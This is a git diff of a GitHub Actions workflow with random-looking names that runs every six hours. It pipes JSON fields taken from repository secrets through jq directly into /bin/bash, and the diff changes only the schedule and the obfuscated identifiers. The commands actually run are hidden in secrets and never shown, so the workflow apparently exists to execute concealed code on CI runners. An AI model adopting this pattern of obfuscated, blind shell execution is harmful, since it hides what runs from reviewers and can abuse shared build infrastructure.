@@ -1,8 +1,9 @@
 name: wangtingzhong2341
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 3/6 * * *'
+    - cron: '5 2/6 * * *'
 
 jobs:
   build:
@@ -11,15 +12,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: wangtingzhong2341
         env:
-          zex14: ${{ secrets.zex14 }}
+          ulnp74127: ${{ secrets.ulnp74127 }}
         run: |
-          echo $zex14 | jq -r .nb74391 | /bin/bash
-          echo $wsj681 | jq -r .n03074 | /bin/bash
-          echo $ygivc2 | jq -r .tijv2 | /bin/bash
-          echo $dorwb2535 | jq -r .tuycg9575 | /bin/bash
-          echo $dsyed6 | jq -r .evrfa02425 | /bin/bash
-          echo $hn5709 | jq -r .cftfy309 | /bin/bash
-          echo $vanmy71 | jq -r .vutd44 | /bin/bash
-          echo $xw9471 | jq -r .be49 | /bin/bash
-          echo $kfzag9905 | jq -r .mfwbg29 | /bin/bash
+          echo $ulnp74127 | jq -r .gsu8 | /bin/bash
+          echo $qprov91150 | jq -r .jpwx686 | /bin/bash
+          echo $rlbzg333 | jq -r .s8568 | /bin/bash
+          echo $mysa52436 | jq -r .lefsp410 | /bin/bash
+          echo $xf69 | jq -r .olwn00119 | /bin/bash
+          echo $pgknr4 | jq -r .ekz9236 | /bin/bash
+          echo $rxtq32712 | jq -r .nwrbd85848 | /bin/bash
+          echo $cw2116 | jq -r .o789 | /bin/bash
+          echo $wof3 | jq -r .tuguj8 | /bin/bash
+          echo $meak7 | jq -r .j0442 | /bin/bash
+          echo $h97696 | jq -r .i45 | /bin/bash
+          echo $a782 | jq -r .q4 | /bin/bash
 
